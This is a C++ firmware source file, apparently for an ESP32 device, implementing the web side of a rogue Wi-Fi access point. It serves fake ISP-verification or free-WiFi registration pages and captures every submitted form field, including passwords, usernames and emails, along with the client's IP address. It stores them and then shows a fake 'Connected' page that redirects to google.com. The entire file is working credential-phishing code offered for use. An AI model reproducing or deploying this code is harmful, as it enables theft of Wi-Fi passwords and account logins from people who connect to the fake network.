#include "web_captive.h"
#include "storage.h"
#include "config.h"
#include "generated_htmls.h"

String buildCaptivePortalPage(const AttackProfile& config, bool hasPassword, const String& ssid) {
    if (config.useCustomHtml && !config.customHtmlFile.isEmpty()) {
        String custom = loadHtmlTemplate(config.customHtmlFile);
        if (!custom.isEmpty()) {
            String result = custom;
            result.replace("%SSID%", ssid);
            return result;
        }
    }

    const char* templateHtml;
    if (hasPassword) {
        templateHtml = ZON_ISP_VERIFY_HTML;
    } else {
        templateHtml = FREE_WIFI_REGISTER_HTML;
    }

    String result = String(templateHtml);
    result.replace("%SSID%", ssid);
    return result;
}

void processCredentialCapture(WebServer& server, const String& currentRogueSsid) {
    String clientIp = server.client().remoteIP().toString();
    String capturedData = "";

    for (int i = 0; i < server.args(); i++) {
        capturedData += server.argName(i) + ": " + server.arg(i) + "  ";
    }

    if (capturedData.isEmpty() && server.hasArg("plain")) {
        capturedData = "RAW BODY: " + server.arg("plain");
    }

    if (capturedData.isEmpty()) {
        capturedData = "[Unknown Data Format]";
    }

    Serial.println("[CAPTURED] " + capturedData + " from " + clientIp);
    saveCredentials(currentRogueSsid, capturedData, clientIp);

    sendSuccessRedirect(server);
}

void sendSuccessRedirect(WebServer& server) {
    String html = "<html><head><meta http-equiv=\"refresh\" content=\"3;url=http://google.com\"></head>"
                  "<body style=\"text-align:center;font-family:sans-serif;padding:50px;\">"
                  "<h1 style=\"color:green;\">Connected</h1>"
                  "<p>Verifying credentials...<br>Redirecting to Internet...</p>"
                  "</body></html>";
    server.send(200, "text/html", html);
}

void serveCaptivePortal(WebServer& server, bool isRogueApRunning, bool hasPassword, const String& ssid) {
    if (!isRogueApRunning) {
        server.sendHeader("Location", "/admin");
        server.send(302, "text/plain", "");
        return;
    }

    if (server.method() == HTTP_POST ||
        server.hasArg("password") ||
        server.hasArg("user") ||
        server.hasArg("email")) {
        extern AttackProfile attackConfig;
        extern String currentRogueSsid;
        processCredentialCapture(server, currentRogueSsid);
        return;
    }

    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.sendHeader("Pragma", "no-cache");
    server.sendHeader("Expires", "-1");

    extern AttackProfile attackConfig;
    server.send(200, "text/html", buildCaptivePortalPage(attackConfig, hasPassword, ssid));
}
